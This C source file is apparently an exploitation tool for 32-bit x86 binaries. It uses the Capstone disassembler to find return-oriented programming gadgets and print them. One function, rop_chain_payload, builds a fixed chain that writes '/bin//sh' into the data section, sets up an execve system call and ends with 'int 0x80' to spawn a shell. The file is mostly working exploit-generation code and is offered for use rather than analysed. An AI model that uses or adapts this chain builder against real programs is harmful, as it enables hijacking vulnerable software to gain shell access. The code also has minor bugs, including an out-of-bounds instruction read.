#include "rop.h"

int rop_chain(unsigned char *binary, unsigned long binary_len)
{
    struct Gadget *head;
    head = (struct Gadget *)malloc(sizeof(struct Gadget));
    if(!head)
    {
        fprintf(stderr ,"malloc failed.\n");
        return -1;
    }
    rop_print_gadgets(binary, binary_len);
    free(head);
    return 0;
}

int rop_print_gadgets(unsigned char *binary, unsigned long binary_len)
{
    size_t count;
    csh handle;
    cs_insn *insn;
    char gadget_string[MaxGadgetLen];
    unsigned int text_address = 0x08048000;
    int total_gadget = 0;
    size_t i,j,k;

    if(cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
        return -1;
    }
    for(i = 0; i < binary_len - MaxGadgetByte; i++)
    {
        count = cs_disasm_ex(handle, binary + i, MaxGadgetByte, text_address + i, 0, &insn);
        if(count > 0)
        {
            strcpy(gadget_string, "");
            for(j = 0; j < count; j++)
            {
                if(!strcmp(insn[j].mnemonic, "ret") && j)
                {
                    total_gadget++;
                    for (k = 0; k < j; k++)
                    {
                        strcat(gadget_string, insn[k].mnemonic);
                        strcat(gadget_string, " ");
                        strcat(gadget_string, insn[k].op_str);
                        strcat(gadget_string, " ; ");
                    }
                    strcat(gadget_string, "ret");
                    printf("0x0%x:\t%s\n", text_address + i, gadget_string);
                    strcpy(gadget_string, "");
                    break;
                }
            }
            cs_free(insn, count);
        }
    }
    printf("Gadget find = %d\n",total_gadget);
    cs_close(&handle);
    return 0;
}

int rop_find_gadgets(char* operate, char* operand, struct Gadget *head, unsigned char *binary, unsigned long binary_len)
{
    size_t count;
    csh handle;
    cs_insn *insn;
    char gadget_string[MaxGadgetLen];
    unsigned int gadget_address;
    size_t i,j;
    unsigned int text_address = 0x08048000;

    if(cs_open(CS_ARCH_X86, CS_MODE_32, &handle) != CS_ERR_OK)
    {
        return -1;
    }
    for(i = 0; i < binary_len - MaxGadgetByte; i++)
    {
        count = cs_disasm_ex(handle, binary + i, MaxGadgetByte, text_address + i, 0, &insn);
        if(count > 0)
        {
            strcpy(gadget_string, "");
            for(j = 0; j < count; j++)
            {
                if(!strcmp(insn[j].mnemonic, "ret") && \
                (!strcmp(insn[j-1].mnemonic, operate) || !strcmp(operate, "xxx"))&& \
                (!strcmp(insn[j-1].op_str, operand) || !strcmp(operand, "xxx")))
                {
                    strcat(gadget_string, insn[j-1].mnemonic);
                    strcat(gadget_string, " ");
                    strcat(gadget_string, insn[j-1].op_str);
                    strcat(gadget_string, " ; ");
                    gadget_address = insn[j-1].address;
                    strcat(gadget_string, "ret");

                    rop_chain_list_add(head, gadget_address, gadget_string);
                    strcpy(gadget_string, "");
                    cs_free(insn, count);
                    cs_close(&handle);
                    return 0;
                }
            }
        }
        cs_free(insn, count);
    }
    printf("-x--------: Can't find *%s %s ; ret*\n", operate, operand);
    cs_close(&handle);
    return -1;
}

int rop_chain_payload(struct Gadget *head, unsigned char *binary, unsigned long binary_len)
{
    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
    rop_chain_list_add(head, 0x080ef060, "@. data");
    rop_find_gadgets("pop", "eax", head, binary, binary_len);
    rop_chain_list_add(head, 0x6e69622f, "/bin");
    rop_find_gadgets("mov", "dword ptr [edx], eax", head, binary, binary_len);

    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
    rop_chain_list_add(head, 0x080ef064, "@. data + 4");
    rop_find_gadgets("pop", "eax", head, binary, binary_len);
    rop_chain_list_add(head, 0x68732f2f, "//sh");
    rop_find_gadgets("mov", "dword ptr [edx], eax", head, binary, binary_len);

    rop_find_gadgets("pop", "edx", head, binary, binary_len);
    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
    rop_find_gadgets("xor", "eax, eax", head, binary, binary_len);
    rop_find_gadgets("mov", "dword ptr [edx], eax", head, binary, binary_len);

    rop_find_gadgets("pop", "ebx", head, binary, binary_len);
    rop_chain_list_add(head, 0x080ef060, "@. data");
    rop_find_gadgets("pop", "ecx", head, binary, binary_len);
    rop_chain_list_add(head, 0x080ef068, "@. data + 8");
    rop_find_gadgets("pop", "edx", head, binary, binary_len);
    rop_chain_list_add(head, 0x080ef068, "@. data + 8");

    rop_find_gadgets("xor", "eax, eax", head, binary, binary_len);
    size_t i;
    for(i = 0; i < 11; i++)
        rop_find_gadgets("inc", "eax", head, binary, binary_len);
    rop_find_gadgets("int", "0x80", head, binary, binary_len);
    return 0;
}

void rop_chain_list_init(struct Gadget *head)
{
    head->next = 0;
    head->prev = 0;
}

int rop_chain_list_add(struct Gadget *head, unsigned int address, char *string)
{
    struct Gadget *gadget;
    if(strlen(string) > MaxGadgetLen)
    {
        fprintf(stderr ,"Gadget buffer overflow.\n");
        return -1;
    }

    gadget = (struct Gadget *)malloc(sizeof(struct Gadget));
    if(!gadget)
    {
        fprintf(stderr ,"malloc failed.\n");
        exit(-1);
    }
    gadget->address = address;
    gadget->next = NULL;
    strcpy(gadget->string, string);
    if(head->next)
    {
        gadget->prev = head->prev;
        head->prev->next = gadget;
        head->prev = gadget;
    }
    else
    {
        head->next = gadget;
        head->prev = gadget;
    }
    return 0;
}

void rop_chain_list_traverse(struct Gadget *head)
{
    struct Gadget *temp;
    for(temp = head->next; temp; temp = temp->next)
    {
        printf("0x0%x: %s\n", temp->address, temp->string);
    }

}

void rop_chain_list_free(struct Gadget *head)
{
    struct Gadget *temp;
    while(head->next != NULL)
    {
        temp = head->next;
        head->next = head->next->next;
        free(temp);
    }
}
